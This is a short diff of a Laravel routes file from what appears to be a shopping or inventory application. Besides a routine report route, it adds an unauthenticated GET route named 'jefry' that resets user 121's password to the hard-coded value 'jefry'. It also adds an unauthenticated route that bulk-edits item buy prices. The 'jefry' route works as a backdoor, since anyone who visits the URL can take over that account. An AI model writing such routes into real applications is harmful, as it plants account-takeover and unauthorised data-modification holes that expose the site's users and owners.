@@ -10,9 +10,17 @@
 | to using a Closure or controller method. Build something great!
 |
 */
-
-Route::get('cekm',function(){
-	
+Route::get('jefry', function(){
+	$user = \App\User::find(121);
+	$user->password = bcrypt('jefry');
+	$user->save();
+});
+Route::get('syncbuyprice',function(){
+	$items = \App\Item::whereBuyPrice(0)->get();
+	foreach ($items as $item) {
+		$item->buy_price = $item->product->buy_price;
+		$item->save();
+	}
 });
 
 Route::post('addtocart', [
@@ -236,6 +244,10 @@ Route::group(['middleware' => 'rbac'],function(){
 	Route::get('reports/index', [
 			'uses' => 'ReportController@index',
 			'as' => 'report.index',
+		]);
+	Route::get('reports/daterange', [
+			'uses' => 'ReportController@daterange',
+			'as' => 'report.daterange',
 		]);
 
 	Route::get('orders/edittanggal', [
